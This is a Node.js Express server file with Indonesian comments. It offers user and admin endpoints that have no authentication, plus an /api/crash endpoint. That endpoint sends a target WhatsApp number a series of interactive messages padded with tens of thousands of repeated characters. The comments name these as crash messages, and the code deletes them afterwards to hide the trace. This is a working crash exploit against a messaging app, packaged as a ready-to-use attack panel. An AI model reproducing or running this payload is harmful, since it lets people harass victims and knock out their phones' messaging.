const express = require("express");
const fs = require("fs");
const crypto = require("crypto");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static("public"));

const loadUsers = () => JSON.parse(fs.readFileSync("./users.json", "utf8"));
const saveUsers = (data) => fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));

app.post("/api/add-user", (req, res) => {
  const { phone, role } = req.body;
  const users = loadUsers();
  users.push({ phone, role });
  saveUsers(users);
  res.json({ success: true, message: "User added." });
});

app.post("/api/add-admin", (req, res) => {
  const { phone } = req.body;
  const users = loadUsers();
  users.push({ phone, role: "admin" });
  saveUsers(users);
  res.json({ success: true, message: "Admin added." });
});

app.post("/api/change-role", (req, res) => {
  const { phone, newRole } = req.body;
  const users = loadUsers();
  const user = users.find(u => u.phone === phone);
  if (user) {
    user.role = newRole;
    saveUsers(users);
    res.json({ success: true, message: "Role updated." });
  } else {
    res.status(404).json({ success: false, message: "User not found." });
  }
});

// TARO FUNCTIONMY
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function ElContol(sock, target, count = 3) {
  const messageIds = [];

  for (let i = 0; i < count; i++) {
    try {
      const message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 99999999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: "📄Null Tanggapan Diterima" + "ꦽ".repeat(7777),
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(9999),
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_call",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_copy",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_reminder",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_cancel_reminder",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "address_message",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "send_location",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "ꦽ".repeat(3000),
                    version: 3,
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({ status: true }),
                    version: 3,
                  },
                  {
                    name: "camera_permission_request",
                    buttonParamsJson: JSON.stringify({ cameraAccess: true }),
                    version: 3,
                  },
                ],
              },
            },
          },
        },
      };

      // kirim message crash
      const msg = await sock.sendMessage(target, message);
      const messageId = msg.key.id;
      messageIds.push(messageId);

      console.log(`✅ [${i + 1}/${count}] Vexnew crash terkirim: ${messageId}`);

      await sleep(600);
    } catch (e) {
      console.error("❌ Error NewEra:", e);
    }
  }

  // 🔥 hapus semua pesan setelah dikirim
  for (let i = 0; i < messageIds.length; i++) {
    const id = messageIds[i];
    await sleep(1000);
    await sock.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: false,
        id,
        participant: sock.user.id,
      },
    });
    console.log(`🗑️ Pesan ${i + 1} dihapus`);
  }

  console.log("✅ Semua pesan crash sudah dihapus");
}
//BATES FUNCTION 

app.post("/api/crash", async (req, res) => {
  const { target } = req.body;
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }

  try {
    await ElContol(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
    res.json({ success: true, message: `Bug terkirim ke ${target}` });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
